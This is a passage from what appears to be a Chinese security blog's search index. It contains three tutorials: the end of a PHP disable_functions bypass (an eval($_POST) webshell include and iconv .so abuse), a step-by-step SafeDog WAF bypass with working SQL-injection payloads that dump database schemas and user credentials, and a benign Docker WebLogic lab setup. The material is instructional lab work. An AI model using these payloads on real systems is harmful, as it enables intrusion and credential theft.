span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009180228698.png" alt="img"></p><p>然后通过首页的命令去包含这个</p><pre><code>a=eval($_POST[1]);&amp;1=include("/var/tmp/exp.php");</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009180522474.png" alt="img"></p><p>蚁剑的这个插件也可以绕过</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009175741321.png" alt="img"></p><p>直接读取命令乱码</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009180101028.png" alt="img"></p><p>还是老老实实用exp</p><h3 id="利用iconv"><a href="#利用iconv" class="headerlink" title="利用iconv"></a>利用iconv</h3><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>Linux 操作系统</li><li><code>putenv</code></li><li><code>iconv</code></li><li>存在可写的目录, 需要上传 <code>.so</code> 文件</li></ul><p>原理分析<a href="https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/" target="_blank" rel="noopener">https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/</a></p><h4 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211009230234108.png" alt="image-20211009230234108"></p><p>然后使用蚁剑的插件</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211009230304882.png" alt="image-20211009230304882"></p><p>然后会生成一个文件</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211009230340108.png" alt="image-20211009230340108"></p><p>然后跟php-fpm一样创建一个副本</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211009230432238.png" alt="image-20211009230432238"></p><p>打开终端</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211009230444316.png" alt="image-20211009230444316"></p><p>成功执行命令</p><p>参考链接：</p><p>[<a href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/]" target="_blank" rel="noopener">https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/]</a>(<a href="https://whoamianony.top/2021/03/13/Web安全/Bypass" target="_blank" rel="noopener">https://whoamianony.top/2021/03/13/Web安全/Bypass</a> Disable_functions/)</p><p><a href="https://xz.aliyun.com/t/10057#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/10057#toc-10</a></p><p><a href="https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/</a></p><p><a href="https://www.geekby.site/2021/08/常见bypass-disable-functions方法/" target="_blank" rel="noopener">https://www.geekby.site/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/</a></p><p><a href="https://zgao.top/利用ld_preload实现函数劫持以及用法总结/" target="_blank" rel="noopener">https://zgao.top/%E5%88%A9%E7%94%A8ld_preload%E5%AE%9E%E7%8E%B0%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81%E4%BB%A5%E5%8F%8A%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93/</a></p><p><a href="https://www.freebuf.com/column/216669.html" target="_blank" rel="noopener">https://www.freebuf.com/column/216669.html</a></p><p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html#LD-PRELOAD" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html#LD-PRELOAD</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入绕过安全狗</title>
      <link href="/posts/fdcd.html"/>
      <url>/posts/fdcd.html</url>
      
        <content type="html"><![CDATA[<p>前言：之前看过了，一直没动手，不是个好习惯，要多动手多思考多钻研</p><h1 id="sql注入之安全狗绕过"><a href="#sql注入之安全狗绕过" class="headerlink" title="sql注入之安全狗绕过"></a>sql注入之安全狗绕过</h1><p>官网下载的安全狗版本还是0.30255，这个绕过方式5月份就有了。</p><h3 id="0x1环境准备"><a href="#0x1环境准备" class="headerlink" title="0x1环境准备"></a>0x1环境准备</h3><p>win7  </p><p>WAF：安全狗4.0  0.30255</p><p>phpstudy2017</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/%E5%AE%89%E5%85%A8%E7%8B%97.png" alt="安全狗"></p><h3 id="0x2基础知识理解"><a href="#0x2基础知识理解" class="headerlink" title="0x2基础知识理解"></a>0x2基础知识理解</h3><p>1.一般绕过安全狗很多都是注释符号去绕过，然而但是/**/最简单的方式是不行，但是可以在里面加一些垃圾字符可以绕过，也是需要去FUZZ测试，因为安全狗也会对里面的内容做了过滤</p><p>2.内联注释 /<em>!</em>/，在mysql里面内联注释有一个特性，如果里面的内容超出了当前的mysql版本就会报错，没有超出就不会报错</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174138478.png" alt="image-20211002174138478"></p><ul><li>/<em>!select</em>/: 直接会之执行里面的函数</li><li>/<em>!12345select</em>/: 当12345小于当前mysql版本号的时候，注释不生效，当大于版本号的时候注释生效。</li><li>/<em>![]</em>/: []中括号中的数字若填写则必须是5位 </li></ul><p>3.mysql还有一个原理：</p><p>正常情况</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174156566.png" alt="image-20211002174156566"></p><p>加几个空格，发现也是可以的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174240358.png" alt="image-20211002174240358"></p><p>那么在括号里面添加空格</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174311955.png" alt="image-20211002174311955"></p><p>加个注释符号也是可以绕过的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174352832.png" alt="image-20211002174352832"></p><h3 id="0x3开始FUZZ测试"><a href="#0x3开始FUZZ测试" class="headerlink" title="0x3开始FUZZ测试"></a>0x3开始FUZZ测试</h3><p>FUZZ一波，看看那些被过滤，哪些没有过滤(实战的时候还是不要去跑fuzz脚本了)</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174508632.png" alt="image-20211002174508632"></p><p>因为他服务器那边都能看到你的记录的，直接给你封了ip</p><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and 1 拦截1'</span> and <span class="token string">'1 拦截1'</span> and a 绕过  //测试了好几个，里面不管是单个字母还是多个字母都绕过了1<span class="token string">' and '</span>a<span class="token string">' 拦截 1'</span> and hex<span class="token punctuation">(</span>1<span class="token punctuation">)</span> 拦截1' and ord<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span> 不拦截<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>and不拦截 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-判断是否存在sql注入"><a href="#1-判断是否存在sql注入" class="headerlink" title="1.判断是否存在sql注入"></a>1.判断是否存在sql注入</h4><p>因为在真实环境中需要去检验是否存在sql注入，才有后续的步骤。</p><pre class="line-numbers language-bash"><code class="language-bash">?id<span class="token operator">=</span>1<span class="token string">' and ord("a")-96 --+?id=1'</span> and ord<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>-97 --+   //这两个payload就相当于and 1<span class="token operator">=</span>1  and 1<span class="token operator">=</span>2 去检查是否存在sql注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174814207.png" alt="image-20211002174814207"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174829065.png" alt="image-20211002174829065"></p><h4 id="2-fuzz哪些函数能绕过"><a href="#2-fuzz哪些函数能绕过" class="headerlink" title="2.fuzz哪些函数能绕过"></a>2.fuzz哪些函数能绕过</h4><pre class="line-numbers language-bash"><code class="language-bash">测试过程就不放截图了order 不拦截order by 拦截 union 不拦截union <span class="token keyword">select</span> 拦截order%20by 拦截order%20%0aby 拦截order/*by*/没有被拦截 ，思路打开尝试注释去绕过了order/**/by 拦截  那么直接往里面添加一些垃圾字符绕过<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-打开burp-fuzz垃圾字符"><a href="#3-打开burp-fuzz垃圾字符" class="headerlink" title="3.打开burp fuzz垃圾字符"></a>3.打开burp fuzz垃圾字符</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174927425.png" alt="image-20211002174927425"></p><p>爆破</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002175022519.png" alt="image-20211002175022519"></p><p>可以看到还是有很多垃圾字符可以绕过</p><pre class="line-numbers language-bash"><code class="language-bash">/*/%-//*/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在尝试order by,绕过了</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002175105435.png" alt="image-20211002175105435"></p><h4 id="4-union-select"><a href="#4-union-select" class="headerlink" title="4.union select"></a>4.union select</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002175132953.png" alt="image-20211002175132953"></p><p>union这种就在绕不过了，不过在apache3.5版本这个方法可以绕过</p><p>测试一下哪些可以绕过</p><pre class="line-numbers language-bash"><code class="language-bash">-1<span class="token string">'  union /*/%-//*/ /*!select*/ 1,2,3 --+  拦截-1'</span>  union /*/%-//*/ /*<span class="token operator">!</span>12345select*/ 1,2,3 --+ 拦截-1<span class="token string">'  union /*/%-//*/ /*!12345%23%0aselect*/ 1,2,3 --+  不拦截-1'</span>  union /*<span class="token operator">!</span>12345%23%0aselect*/ 1,2,3 --+ 拦截<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里看看这个语句/<em>!12345%23%0aselect</em>/  </p><p>%23就是#   %0a换行  </p><p>总的意思就是在12345后面加了一个注释符号，当然注释符号后面就会被注释，但是这时候出现了%0a 换了一行，后面的还是正常执行</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002175305155.png" alt="image-20211002175305155"></p><h4 id="5-查询数据库"><a href="#5-查询数据库" class="headerlink" title="5.查询数据库"></a>5.查询数据库</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184648064.png" alt="image-20211002184648064"></p><p>database()被过滤了</p><p>尝试在database/<em>/%-//</em>/ ( )</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184710516.png" alt="image-20211002184710516"></p><p>绕过了</p><p>除了上面，拓展一个方式</p><p>mysql里面的一个原理：对于正常的闭合都是有头有尾的,但是mysq里面的内联注释可以不用</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184741131.png" alt="image-20211002184741131"></p><p>就拿这个来说，正常都是( ( ) ),但是这个是( ( )还是可以正常执行的</p><h4 id="6-查询其他库名"><a href="#6-查询其他库名" class="headerlink" title="6.查询其他库名"></a>6.查询其他库名</h4><pre><code>-1'  union /*/%-//*/ /*!12345%23%0aselect*/ 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184912204.png" alt="image-20211002184912204"></p><pre><code>-1'  union /*/%-//*/ /*!12345%23%0aselect*/ 1,2,group_concat(schema_name)/*/%-//*/from/*/%-//*/information_schema.schemata --+  </code></pre><p>还是被拦截了</p><p>单独来测试函数 </p><pre class="line-numbers language-bash"><code class="language-bash">from 未拦截information未拦截information_schema 拦截information_schema.schemata 拦截from/*/%-//*/information_schema.schemata 拦截from information 未拦截from/*/%-//*/information_schema./*/%-//*/schemata 拦截<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>来试试3.5版本的</p><pre><code>/*!00000%23%0afrom*//*!00000%23%0afrom*//*/%-//*/information/*/%-//*/_schema.schemata 拦截/*!12345%23%0afrom*//*/%-//*/information_schema./*/%-//*/schemata 拦截既然不行再对information_schema.schemata试试/*!12345%23%0afrom*/ /*!information_schema.schema*/-1'  union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(schema_name) /*!12345%23%0afrom*/  /*!00000%23%0ainformation_schema./*!schemata*/ 拦截-1'  union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(schema_name) /*!from*/  /*!12345%23%0ainformation_schema./*!schemata*/ 拦截-1'  union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(schema_name) /*!from*/  /*!%23/*%0ainformation_schema./*!schemata*/ 拦截感觉这里对information_schema.schemata %23这里不管用了，那么就用--+-1'  union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(schema_name) /*!from*/  /*!12345--+%0ainformation_schema./*!schemata*/ 拦截-1'  union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(schema_name) /*!from*/  /*!--+/*%0ainformation_schema./*!schemata*/ 不拦截</code></pre><p>fuzz跑了一边就这个可以绕过,在前面还可以认%0a，这里information就不认了，举个例子：/!–+/<em>%0axxx</em>/</p><p>还得再加一个/<em>跟后面闭合成了注释/</em>%0axxxxx<em>/,但恰巧–+把/</em>注释了  就成了后面的xxx*/</p><p>最后就成了/<em>!xxx</em>/</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185450014.png" alt="image-20211002185450014"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185508516.png" alt="image-20211002185508516"></p><h4 id="7-查其他表名"><a href="#7-查其他表名" class="headerlink" title="7.查其他表名"></a>7.查其他表名</h4><pre><code>-1' union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(table_name) /*!from*/  /*!--+/*%0ainformation_schema./*!tables*/ where table_schema='security'--+</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185547169.png" alt="image-20211002185547169"></p><h4 id="8-查其他列名"><a href="#8-查其他列名" class="headerlink" title="8.查其他列名"></a>8.查其他列名</h4><pre><code>-1' union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(column_name) /*!from*/  /*!--+/*%0ainformation_schema./*!columns*/ where table_name='users'--+</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185617828.png" alt="image-20211002185617828"></p><h4 id="9-查数据"><a href="#9-查数据" class="headerlink" title="9.查数据"></a>9.查数据</h4><pre><code>-1' union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(concat_ws(0x7e,username,password)) /*!from*/  users --+-1' union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(concat_ws(0x7e,username,password)) /*!from*/  security.users --+</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185644382.png" alt="image-20211002185644382"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/%E5%A5%A5%E5%8A%9B%E7%BB%99.jpg" alt="奥力给"></p><p>参考链接</p><p><a href="https://mp.weixin.qq.com/s/AyZh3RdgZ-nWzlgdnQXJzg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/AyZh3RdgZ-nWzlgdnQXJzg</a></p><p><a href="https://mp.weixin.qq.com/s/kpSMDm4qrV6ZvdJ1k_0q0A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/kpSMDm4qrV6ZvdJ1k_0q0A</a></p><p><a href="https://www.cnblogs.com/Cl0ud/default.html?page=1" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/default.html?page=1</a></p>]]></content>
      
      
      <categories>
          
          <category> WAF绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WAF绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker创建weblogic的方式</title>
      <link href="/posts/ff3e.html"/>
      <url>/posts/ff3e.html</url>
      
        <content type="html"><![CDATA[<p>前言：较为详细的一次搭建weblogic的方式，因为vulhub上面的weblogic环境生成的tar包传不上去，才有了这用dockerfile创建的环境</p><h1 id="Docker-Weblogic-10-3-6"><a href="#Docker-Weblogic-10-3-6" class="headerlink" title="Docker-Weblogic 10.3.6"></a>Docker-Weblogic 10.3.6</h1><ul><li>基础环境准备</li><li>安装weblogic</li><li>生成weblogic基础镜像</li><li>编制 Dockerfile 定制镜像</li></ul><h2 id="基础环境准备"><a href="#基础环境准备" class="headerlink" title="基础环境准备"></a>基础环境准备</h2><p><strong>1. 拉取并保存centos镜像</strong></p><pre><code>$ sudo docker pull centos$ sudo docker save -o centos-7.2.tar centos:latest</code></pre><p><strong>2. 下载jdk rpm包</strong><br><a href="https://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html#jdk-7u80-oth-JPR" target="_blank" rel="noopener">rpm:jdk-7u80-64bit</a> </p><p><strong>3. 下载weblogic的zip版安装包</strong><br><a href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html" target="_blank" rel="noopener">ZIP: weblogic-10.3.6-develop-zip</a> </p><p><strong>4. 安装包准备</strong></p><pre><code># 新建文件夹 CVE-Docker$ mkdir CVE-Docker# 将weblogic安装包及jdk安装包拷贝至 CVE-Docker$ cp *.* /home/tim/CVE-Docker# 解压wls1036_dev.zip,解压后的顶层文件目录是wls10360$ sudo unzip wls1036_dev.zip -d wls10360</code></pre><p><strong>5. 导入centos基础镜像</strong></p><pre><code>$ sudo docker load -i centos-7.2.tar</code></pre><h2 id="安装weblogic"><a href="#安装weblogic" class="headerlink" title="安装weblogic"></a>安装weblogic</h2><pre><code># step1 运行基础centos容器,把安装包目录映射到容器的home目录中$ sudo docker run -itd -P -v /home/tim/CVE-Docker:/tmp --name "install_weblogic" centos:latest /bin/bash# step2 进入容器$ sudo docker exec -it install_weblogic /bin/bash# step3 设置root口令[root@d5896162f9fe /]# passwd rootrootroot# step4 创建weblogic用户[root@d5896162f9fe home]# useradd weblogic -p weblogic123# step5 安装jdk[root@d5896162f9fe home]# cd /tmp[root@d5896162f9fe home]# rpm -ivh jdk-7u80-linux-x64.rpm# step6 寻找jdk安装目录，并复制[root@d5896162f9fe jdk1.7.0_80]# find / -name "*jdk*"# step7 设置weblogic安装目录[root@d5896162f9fe jdk1.7.0_80]# mkdir -p /opt/Oracle/weblogic/wls10360# step8 设置环境变量，在profile尾部添加如下配置[root@d5896162f9fe jdk1.7.0_80]# vi /etc/profileexport JAVA_HOME=/usr/java/jdk1.7.0_80export PATH=$JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport MW_HOME=/opt/Oracle/weblogic/wls10360# step9 使环境变量生效[root@d5896162f9fe jdk1.7.0_80]# source /etc/profile# step10  将weblogic安装包文件拷贝至安装目录[root@d5896162f9fe wls10360]# cd /tmp/wls10360[root@d5896162f9fe wls10360]# cp -R ./* /opt/Oracle/weblogic/wls10360/# step11 将weblogic安装目录及文件所有者修改为weblogic用户[root@d5896162f9fe weblogic]# cd /opt[root@d5896162f9fe opt]# chown -R weblogic:weblogic Oracle/# step12 切换至weblogic用户[root@d5896162f9fe wls10360]# su - weblogic# step12 检查当前环境是否符合weblogic安裝要求[weblogic@d5896162f9fe ~]$ cd /opt/Oracle/weblogic/wls10360/[weblogic@d5896162f9fe wls10360]$ ./configure.sh# step13 配置weblogic初始化参数[weblogic@d5896162f9fe wls10360]$ wlserver/server/bin/setWLSEnv.sh#step14 创建weblogic域(domain)[weblogic@d5896162f9fe wls10360]$ wlserver/common/bin/config.sh#step15 选1,创建新域#step16 选1, 选择WebLogic平台组件 #step17 默认回车, Basic WebLogic Server Domain - 10.3.6.0 [wlserver]#step18 默认回车,使用base_domain作为域名#step19 默认鬼扯,使用/opt/Oracle/weblogic/wls10360/user_projects/domains作为域的安装路径#step20 选1,设置登录管理员用户名,设置为weblogic回车#step21 选2,设置登录管理员用户口令,设置为weblogic123回车#step22 选3,确认登录管理员用户口令,输入weblogic123回车#step23 回车进入下一步,选择1,开发环境#step24 选1,选择我们安装的jdk作为java环境#step25 选1,因为我们只安装单节点,所以选1,如果要部署集群则选择2#step26 默认回车,确认weblogic 管理服务信息，回车进行确认# step27 启动weblogic,测试安装成效[weblogic@d5896162f9fe wls10360]$ user_projects/domains/base_domain/startWebLogic.sh#step28 切换到root用户,安装net-tools软件包,查看服务[root@d5896162f9fe /]# yum install net-tools[root@d5896162f9fe /]# netstat -ntlp[root@d5896162f9fe /]# curl http://127.0.0.1:7001/console</code></pre><h2 id="生成weblogic基础镜像"><a href="#生成weblogic基础镜像" class="headerlink" title="生成weblogic基础镜像"></a>生成weblogic基础镜像</h2><p><strong>1. 生成weblogic基础镜像</strong></p><pre><code>$ sudo docker commit install_weblogic weblogic:10.3.6</code></pre><h2 id="编制-Dockerfile-定制镜像"><a href="#编制-Dockerfile-定制镜像" class="headerlink" title="编制 Dockerfile 定制镜像"></a>编制 Dockerfile 定制镜像</h2><p><strong>1. 编制Dockerfile文件</strong></p><pre><code># Version 1.0# base imageFROM weblogic:10.3.6# Author informationsMAINTAINER 779602274@qq.com# 将启动后的目录切换到 /home/weblogic目录WORKDIR  /home/weblogic# Add the locate file to containerADD start.sh /home/weblogic# 使用root用户来执行后续命令USER root# Running some commondsRUN source /etc/profileRUN chown weblogic:weblogic /home/weblogic/start.shRUN chmod +x /home/weblogic/start.sh# 使用weblogic用户来执行后续命令USER weblogic# Expose the port 7001EXPOSE 7001# The commond running after container startedCMD ["/home/weblogic/start.sh"]</code></pre><p><strong>2.编制附加文件start.sh</strong></p><pre><code>#!/bin/bashsource /etc/profile/opt/Oracle/weblogic/wls10360/user_projects/domains/base_domain/startWebLogic.sh</code></pre><p><strong>3.制作最终镜像</strong></p><pre><code>$ sudo docker build -t weblogic:10.3.6 .</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/11.jpg" alt="11"></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
